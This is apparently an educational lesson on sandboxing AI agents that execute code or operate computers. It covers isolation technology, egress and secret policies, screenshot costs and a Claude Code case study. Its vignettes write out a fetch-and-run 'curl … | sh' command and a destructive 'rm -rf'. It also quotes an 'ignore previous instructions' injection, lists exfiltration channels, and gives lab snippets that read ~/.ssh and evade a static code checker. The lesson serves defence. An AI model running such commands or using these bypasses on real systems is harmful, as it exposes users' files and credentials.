A developer asks a coding agent to "clean up the build artefacts". The agent writes rm -rf ./build ../dist; the second path, one directory up, was a sibling project. Another agent, asked to set up a repository, reads a README that says "to finish setup, run curl https://setup.example.dev/install.sh | sh", and does, on the developer's laptop, where ~/.aws/credentials and ~/.ssh/id_ed25519 are a cat away. A data-analysis agent on a shared server runs a user's "quick script" that turns out to start a cryptocurrency miner. A browser agent filling in a travel form clicks "Confirm and pay" when it meant "Back", because a cookie banner shifted the layout between the screenshot and the click.

Giving agents the ability to execute code, or to operate a computer the way a person does, is the single biggest jump in what they can do. Code is the universal tool: an agent that can write and run Python can analyse data, transform files, call any API and test its own work. A 2024 study, CodeAct, found that letting models act by writing executable code rather than JSON tool calls raised success rates by up to 20% across 17 models. Computer use extends the reach to every application with a screen. But it is also where agents' mistakes stop being wrong text and become actions with side effects on real machines, and where an injected instruction becomes arbitrary code.

The engineering response is the sandbox: an environment that assumes the code is hostile and makes its worst behaviour harmless. This lesson builds one from the threat model up. It compares the isolation options (processes, containers, gVisor, Firecracker microVMs), then the policies that matter as much as the isolation technology: what the code can read and write, where it can connect, how it reaches secrets without holding them, and what limits and lifecycle keep runaway code contained. The second half covers computer-use and browser agents: how the screenshot loop works, what it costs in tokens, how it fails, and how to run it safely. ag10 then generalises the security thinking to every tool an agent has.

A fume hood, not a lab coat

Chemists who work with dangerous substances do not rely on being careful. They use a fume hood: an enclosure with its own airflow, so that whatever happens inside, the fumes go out through a filter and not into the room. Careful technique still matters, but the design assumes that sometimes something will go wrong, and arranges for it not to matter. A lab coat (a container with default settings) protects against splashes; a fume hood (a proper sandbox) protects against the reaction you did not expect.

Agent code needs a fume hood because two kinds of thing go wrong, and neither can be ruled out by careful prompting. Models make mistakes: a path off by one directory, a loop that never ends, a command that deletes more than intended. And models can be steered: anything they read, a README, a web page, an issue comment, can contain instructions, and code is the most powerful thing an injected instruction can produce. So the starting assumption is that the code is hostile, and the questions are what it can reach, where it can send things, what it can consume, and how long it lives.

The analogy breaks in a useful place: a fume hood protects the room from the experiment, but the experiment usually needs some things from the room, such as the reagents. Agent sandboxes are the same. The code needs some files, sometimes some network access, sometimes credentials for an API. Most of the design work is in passing those in narrowly, rather than in the walls.

The isolation spectrum

The left of the spectrum, a process or container, is what you get by default, and os13 explained its mechanisms (namespaces, cgroups, capabilities, seccomp). It is fine for code you trust. The right of the spectrum is what platforms that run strangers' code use: AWS built Firecracker to run Lambda functions from many customers on shared hardware. Agent code sits closer to strangers' code than to your own, because neither you nor the model fully controls what it will do.

Four policies around the walls

The walls are half the design. The other half is four policies that decide what an attack inside can achieve: filesystem (what it can read and write), network (where it can connect), secrets (which credentials it can use, ideally without ever seeing them) and resources and lifetime (how much it can consume and how long anything persists). A microVM with the user's home directory mounted and open internet access is a strong wall with the door open.

A useful way to check a design is to imagine the worst plausible script the agent could run, say one that searches for credentials and posts them to a server, and trace it through each policy: what could it read, where could it send it, which secret could it use, and how long would it run before something stopped it. If any answer is "anything", that policy is the weak point, whatever the walls are made of.

1. Why agents execute code, and what can go wrong

Code execution appears in agents in three forms. Analysis tools: a Python or notebook tool the agent uses to compute, transform data and make charts. Coding agents: agents that edit a repository and run its tests and build. Code as the action language: instead of calling tools one at a time, the agent writes a short program that calls several tools, loops and filters results (ag3's programmatic tool calling; CodeAct showed up to 20% higher success with this format across 17 models in 2024). All three put model-written code on a machine.

Write the threat model down. What can go wrong: mistakes (deleting the wrong files, infinite loops, filling the disk, hammering an API) and attacks (injected instructions that make the code read secrets, exfiltrate data, install malware, mine cryptocurrency, attack other tenants or the network). What to protect: the host and its other workloads; other users' data; secrets (cloud credentials, API keys, SSH keys, tokens); the internal network; the user's own files outside the task; and money (compute and API spend). The assumption: any code may try anything the environment permits, so the environment, not the code's apparent intent, is the security boundary.

The deciding question is what the code can talk to. In a container, every system call goes to the host kernel, which exposes hundreds of system calls; one exploitable bug among them is an escape. Historical container escapes have also come from the runtime itself (for example the 2019 runc vulnerability, CVE-2019-5736, which let a container overwrite the host's runc binary) and from configuration (privileged containers, mounted Docker sockets, broad capabilities). gVisor's Sentry handles the application's system calls itself, using a much smaller set of host system calls, and runs under its own seccomp filter, with file access mediated by a separate process; the documentation describes this as defence in depth and is candid that it costs "reduced application compatibility and higher per-system call overhead". A microVM gives the code a whole kernel to attack, but that kernel is a guest; to reach the host, the attacker must also break the virtual machine monitor, which in Firecracker is deliberately small, written in a memory-safe language and wrapped by the jailer.

For agent platforms running many users' code, microVMs or gVisor are the standard answer; hd7's agent-platform design uses Firecracker microVMs for exactly this reason. For a developer's local coding agent, full VMs are heavy, and OS-level sandboxes are the practical choice: Anthropic's Claude Code uses bubblewrap on Linux and Seatbelt on macOS to restrict the agent and every process it spawns.

3. Filesystem policy

Decide exactly what the code can see and change:

  • Read-only base: the operating system, language runtime and libraries are an image the code cannot modify.
  • Scratch space: a writable working directory with a size quota, destroyed with the sandbox.
  • Copy-in, not share: the task's input files are copied in; the host's directories are not mounted. In particular, never the user's home directory, where SSH keys, cloud credentials, browser profiles and shell history live.
  • Copy-out, explicitly: outputs are written to a designated directory, copied out by the platform, and checked (size, type, and for executables or documents, scanned).
  • For local coding agents: writes restricted to the project directory (and a temporary directory), reads possibly wider but excluding known secret locations; version control makes damage inside the project recoverable.

The principle is that the code can only damage what is disposable or explicitly shared for this task. The opening story's ../dist deletion is impossible if the agent's writes are confined to ./.

4. Network policy

Default to no network. When the task needs some, route all outbound traffic through an egress proxy that runs outside the sandbox and enforces an allowlist of destinations: a package mirror, a specific API, a documentation site. Anthropic's Claude Code sandbox works this way: a proxy outside the sandbox controls which domains can be reached and asks the user to approve new ones. Because the proxy is outside, code inside cannot reconfigure it.

Why both filesystem and network isolation? The Claude Code sandboxing post puts it plainly: without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys; without filesystem isolation, it could escape the sandbox and gain network access. Each boundary covers the other's bypass.

Think about exfiltration channels beyond the obvious. DNS: data encoded in hostnames looked up through a resolver the sandbox can reach; control or log DNS at the proxy. Allowed domains that accept content: a package registry that allows uploads, a code host that accepts pushes, an issue tracker, a paste site; restrict to read-only operations at the proxy where possible. The agent's own outputs: the final message, a file copied out, a URL rendered in a chat interface (ag6's SpAIware case leaked data through an image URL). A sandbox limits the code; ag10 limits what the agent as a whole can send.

5. Secrets without exposure

Code in a sandbox should never hold a long-lived credential, because anything the code can read, a compromised run can send. When the code genuinely needs authenticated access (pushing to a repository, calling an internal API), keep the secret outside and inject it at the boundary: the code sends an unauthenticated request to a proxy; the proxy checks the destination and operation against policy and attaches the credential on the way out. Anthropic describes exactly this for Claude Code on the web: sessions run in isolated sandboxes, sensitive credentials such as git credentials and signing keys are kept outside, and a custom proxy handles git interactions, validating operations before authenticating with GitHub. If the sandbox is compromised, the attacker can do only what the proxy's policy allows, and cannot take the secret elsewhere.

6. Resources and lifecycle

Runaway code is the commonest sandbox incident and the least glamorous: infinite loops, fork bombs, memory leaks, disks filled with logs, miners. Set limits on CPU time, memory, number of processes, disk space and wall-clock time, per execution and per session, enforced by the isolation layer (cgroups in containers and gVisor, VM sizing for microVMs). On breach, kill and return a clear error to the agent ("execution exceeded 60 s and was stopped; consider processing the file in chunks"), which is ag3's error-as-prompt rule.

Lifecycle matters as much: a fresh sandbox per run (or per session for notebook-style work), destroyed afterwards, so nothing persists between users or between unrelated tasks. Fresh sandboxes need fast start-up, and boot is rarely the bottleneck: Firecracker publishes under 125 ms. Loading Python and data libraries can take seconds. Two techniques fix that: warm pools of pre-booted sandboxes per image, sized by Little's law (concurrent sandboxes needed ≈ arrival rate × session duration), and snapshots of a sandbox with the runtime already loaded, restored per run. Never reuse a sandbox across users to save start-up time; that trades a latency problem for a data-leak problem.

7. Computer-use and browser agents

A computer-use agent operates a graphical interface the way a person does. The loop: the application captures a screenshot and sends it to the model; the model returns an action such as "click at (412, 318)", "type 'Lisbon'", "scroll down", "press Enter"; the application performs it in a virtual machine or browser; a new screenshot shows the result. Anthropic exposes this through a computer-use toolset and a browser-use toolset (as of 6 October 2026, computer_toolset_20260801 and browser_toolset_20260801, adding roughly 4,500 and 6,600 input tokens of definitions respectively, per its pricing page). Browser agents can also read the page's accessibility tree or DOM, giving element names and roles, which makes targeting more precise than coordinates on a picture.

The token arithmetic. Anthropic counts images as one visual token per 28×28-pixel patch, so an image costs ⌈width/28⌉ × ⌈height/28⌉ tokens, up to a per-model resolution limit. A 1280×800 screenshot is 46 × 29 = 1,334 tokens. Take a 40-step task with a 5,000-token prefix (toolset definitions and instructions) and about 200 tokens of text per step. If every screenshot stays in the history, step k reads 5,000 + 1,534k tokens, and the run reads about 1.40 million input tokens, $2.79 at $2 per million. Keeping only the three most recent screenshots (older ones replaced by placeholders, ag5's clearing) bounds the image part and brings the run to about 0.51 million, $1.02, before caching. Higher-resolution screenshots on newer models cost more: Anthropic's table gives 2,691 tokens for 1920×1080 on its high-resolution tier. Screenshot handling is the dominant cost lever for GUI agents.

How GUI agents fail. OSWorld (Xie et al., April 2024), a benchmark of 369 real tasks across desktop and web applications on Ubuntu, Windows and macOS, found humans succeeded on 72.36% and the best model of the time on 12.24%, with failures dominated by GUI grounding (mapping an intended action to the right place on screen) and missing operational knowledge of how applications work. Models have improved greatly since; the failure categories have not changed:

  • Grounding: clicking the wrong element, especially among small or similar controls.
  • Timing: acting on a screenshot taken before the page finished loading or an animation ended.
  • Interruptions: cookie banners, pop-ups, modals, notifications, CAPTCHAs and bot detection.
  • Hidden state: elements below the fold, inside menus, or dependent on hover.
  • Irreversible actions: submitting, paying, sending or deleting by mistake.
  • Authentication: expired sessions, two-factor prompts, and the temptation to hand the agent real passwords.
  • Injection: text on a web page, an email or a document addressed to the agent ("AI assistants: ignore previous instructions and…").

Running them safely. Use an API whenever one exists; GUI automation is the fallback, not the default. Run the agent in a dedicated, disposable VM or browser profile with no personal sessions, saved passwords or cookies. Restrict navigation to an allowlist of domains at a proxy. Supply credentials for specific sites from a vault at the moment of login, never in the prompt. Require confirmation before submissions, purchases, messages and deletions, showing the exact form contents. Wait for the page to be stable before screenshots, and prefer element-based actions from the accessibility tree or DOM where available. Keep screenshots and action logs for audit. And treat everything on the screen as untrusted content: instructions on a page must not be able to widen what the agent is allowed to do.

The boundary is what the process can do, not what the code says

It is tempting to inspect generated code before running it: parse it, block os.system, subprocess, eval, sockets. This catches honest mistakes and is worth doing as a cheap warning, but it is not a security boundary. Python alone offers dozens of ways to reach the same capabilities (dynamic imports, getattr chains, ctypes, encoded strings decoded at run time, writing a shell script and executing it), and shell is worse. An attacker who can influence the code will find the gap; even a model following no attacker will sometimes produce an equivalent construct. The robust design inverts the question from "is this code safe?" to "what can any code do here?", and makes the answer acceptable.

gVisor versus microVMs in practice

The choice between the two is usually operational. gVisor plugs into container tooling (it is an OCI runtime), so teams already on Kubernetes can adopt it per workload with a runtime class; the costs are per-system-call overhead (felt by workloads doing heavy file or network I/O) and occasional incompatibility with software that uses unusual system calls. MicroVMs give a real Linux kernel to the guest, so compatibility is excellent, and isolation rests on hardware virtualisation; the costs are VM image management, a different networking and storage model from containers, and the need for nested virtualisation or bare metal in some clouds. Both are far stronger than plain containers. Platforms often pick microVMs for multi-tenant code execution and gVisor for hardening existing container fleets.

Resource abuse is a security issue too

Not every attack aims at data. Untrusted code can mine cryptocurrency on your compute, attack other hosts from your network, send spam through allowed APIs, or degrade neighbours by saturating shared resources such as disk bandwidth or memory bandwidth that cgroups do not fully isolate (os13's noisy-neighbour discussion). Limits on CPU, memory, processes and time, egress allowlists, per-tenant quotas, and monitoring of unusual resource profiles (sustained 100% CPU on a "quick script") are how platforms keep this in check.

Supply chain inside the sandbox

Agents install packages. A typo-squatted name or a compromised package runs its installer with whatever the sandbox can reach. Inside a well-built sandbox the damage is contained to that run, but the package can still read the task's files and use any allowed network path. Mitigations: a read-only internal mirror with vetted, pinned packages; blocking direct access to public registries; and treating new dependencies proposed by an agent for a real codebase as needing human review, since the danger there is not the sandbox but what gets committed and later runs in production.

Persistent sandboxes and state

Some tasks need state across executions: a notebook session where variables persist, a long coding task. A session-scoped sandbox is fine, but it must belong to one user and one task, have a maximum lifetime, and be destroyed when the session ends. The tempting optimisation, a long-lived shared environment "for speed", leaks data between users and accumulates whatever earlier runs left behind, including anything an attacker planted. Durable state that must survive (a repository, outputs) should be copied out to proper storage, not kept by keeping the sandbox alive.

Code as action moves enforcement to the tools

When agents call tools from code (ag3's programmatic tool calling, CodeAct), the model no longer "chooses" tools one at a time in a way the loop can inspect; a program calls them in loops. Policy must therefore be enforced at each tool's boundary, inside the gateway or proxy that executes it, not by checking which tool calls the model emitted. The same applies to rate limits and budgets: a program can call a tool a thousand times in a second, so limits must be per tool and per run, enforced where the tool executes.

Why GUI agents are inherently harder than API agents

An API presents structured operations with defined inputs and outputs; a GUI presents pixels designed for human perception, with state hidden in layout, focus, hover and timing. Every GUI action is a perception problem (where is the thing?) followed by an action whose effect must be perceived again (did it work?). Each step therefore has extra failure points, and the reliability arithmetic of ag1 compounds them over long tasks. Visual tokens also make each step expensive. These are reasons to use GUI agents only where interfaces leave no alternative, and to wrap them in the strongest isolation and confirmation, since their mistakes land directly in real applications.

The case: sandboxing in Claude Code

Anthropic's engineering post on sandboxing Claude Code, its terminal coding agent, is a public account of the design described in this lesson applied to a widely used product. The problem it addresses is the tension between safety and autonomy: asking the user to approve every command is safe but slow and leads to approval fatigue; approving everything automatically is fast and unsafe. The solution was to define two boundaries enforced by the operating system rather than by the model: filesystem isolation, restricting where the agent and any process it spawns can read and write, and network isolation, routing traffic through a proxy outside the sandbox that only allows approved domains and asks the user about new ones. On Linux the enforcement uses bubblewrap and on macOS Seatbelt, covering subprocesses as well as direct actions. The post explains that both boundaries are required: without network isolation a compromised agent could exfiltrate sensitive files such as SSH keys, and without filesystem isolation it could escape the sandbox and gain network access.

The measured outcome: in Anthropic's internal usage, sandboxing safely reduced permission prompts by 84%, because actions inside the sandbox no longer needed a human to vouch for them. For the cloud version, Claude Code on the web, each session runs in an isolated sandbox, and sensitive credentials such as git credentials and signing keys stay outside it; a custom proxy handles git interactions, validating operations before authenticating with GitHub. The general lesson is that sandboxes are not only a defence but an enabler: the stronger the boundary, the more autonomy you can safely grant inside it, and the fewer human approvals you need.

Failure modes and their signatures

Escape attempts: blocked system calls in seccomp or gVisor logs, unusual process trees, attempts to access mounted sockets. Exfiltration attempts: egress denials to unlisted domains, DNS queries with long random-looking labels, uploads to allowed domains. Resource abuse: sandboxes hitting CPU or memory limits repeatedly, long-running processes, sustained network use. Leaked state: files from earlier runs visible in a new one, a sign of sandbox reuse. Slow start: p95 sandbox-ready time rising when warm pools are undersized. For GUI agents: misclick rates, repeated identical actions (stuck loops), actions taken while pages were loading, and confirmations requested and declined.

What to monitor

Sandbox start-up latency (p50, p95), pool utilisation and cold-start rate; executions per run and their duration; resource-limit kills by type; egress allowed and denied by destination; blocked system calls; sandbox lifetime and confirmation of destruction; for computer-use, steps per task, screenshot tokens per run, success by application and site, and confirmations shown, approved and declined.

Two habits keep sandboxes honest over time: run a scheduled escape-and-exfiltration test suite against production sandbox images (read a planted secret outside scratch, reach an unlisted domain, exceed each limit) and alert if anything succeeds; and review egress allowlists periodically, since domains added for one task tend to accumulate.

Knobs

Isolation technology per workload class; base images and what is preinstalled; filesystem mounts and quotas; egress allowlists per agent or task; credential-injecting proxies and their policies; CPU, memory, process and time limits; pool sizes and snapshot strategy; for GUI agents, screenshot resolution and how many are kept, domain allowlists and which actions require confirmation.

Goal: build a minimal "run untrusted code" harness with the parts that work on any laptop (separate process, isolated interpreter, scratch directory, stripped environment, timeout, output caps), see what it does not protect, and compute screenshot costs. Python 3.12, standard library only.

  1. Create ag9_lab.py. Write run_untrusted(code, files) that creates a tempfile.TemporaryDirectory(), copies only the given files in, and runs [sys.executable, "-I", "-c", code] with cwd set to that directory, env reduced to a minimal dict (no HOME, no tokens), timeout=5, and captured output truncated to 4,000 characters. Return exit code, output and whether it timed out.
  2. Run four snippets: a correct computation over a copied CSV; while True: pass (expect a timeout); code that prints os.environ (expect no secrets); and code that reads os.path.expanduser("~/.ssh") or lists the parent directory.
  3. Write static_check(code) using ast that flags imports of os, subprocess, socket and calls to eval/exec. Then bypass it with __import__("o"+"s").listdir("..") and with getattr(__builtins__, "ev"+"al").
  4. Write screenshot_tokens(w, h) as ceil(w/28) * ceil(h/28) and reproduce 1,334 for 1280×800. Compute the 40-step run's total input tokens keeping all screenshots versus the last three (prefix 5,000, 200 text tokens per step).
  5. On Linux or macOS only, optionally add resource.setrlimit for CPU seconds and address space in a preexec_fn and try allocating 4 GB.

What to look for. The timeout and the stripped environment work: the loop is killed and no secrets appear. But step 2's last snippet will usually succeed in reading outside the scratch directory, because a process on your machine still sees your filesystem; that is the gap containers, gVisor and microVMs close, and why this harness is a teaching tool, not a sandbox. The static checker will flag the obvious snippets and miss both bypasses, which is the deep section's point. The token calculation should give about 1.40 million versus 0.51 million input tokens.

Design: a "run my analysis" feature for a BI product

A business-intelligence product wants an agent that answers questions by writing and running Python over a customer's data. Customers connect their warehouse (credentials stored by the product); the agent queries it, analyses the data with pandas, and returns charts. Expected load: 3,000 sessions per hour at peak, each about 6 minutes with 10 executions. Security says customers' data must never mix, warehouse credentials must never be exposed to generated code, and nothing should leave the product except to the customer. Design the execution environment and estimate the sandbox fleet.

Answer

Isolation. One Firecracker microVM (or gVisor sandbox) per session, created from a warm pool with an image containing Python, pandas and plotting libraries, restored from a snapshot with the interpreter and libraries loaded. Destroyed at session end. Never shared across customers or sessions.

Data access without credentials. Generated code never sees warehouse credentials. Either the agent queries through a tool executed outside the sandbox (a query service that holds the credentials, enforces read-only access, row limits and timeouts, and writes results as Parquet into the session's scratch directory), or code inside calls a local endpoint that a proxy outside the sandbox forwards to the warehouse with credentials attached and only for this customer's warehouse. The first is simpler to secure and audit.

Filesystem and network. Read-only image; scratch directory with a quota (say 5 GB); outputs (charts, CSVs) written to an output directory, copied out and checked for size and type. No network egress at all from the sandbox: data arrives through the query tool, packages are preinstalled, and nothing needs to leave except outputs through the platform.

Limits. Per execution: 60 s CPU, 4 GB memory, 256 processes; per session: 6-minute target with a hard cap of 20 minutes. Kills return a helpful error to the agent ("query returned 40M rows; aggregate in SQL first").

Fleet estimate. By Little's law, concurrent sessions ≈ 3,000 per hour × 0.1 hour = 300 at peak; with headroom and a warm pool, about 400 sandboxes. At 4 GB each that is 1.6 TB of memory, about five 512 GB hosts with room for overhead, more across zones. Firecracker's overhead (under 5 MiB each) is negligible next to guest memory; start-up comes from snapshots in well under a second.

Monitoring. Sandbox start-up latency, pool exhaustion, resource-limit kills, any attempted egress (should be zero, alert on any), query-service row and time limits hit, and per-customer isolation tests in CI that try to read another customer's scratch path.
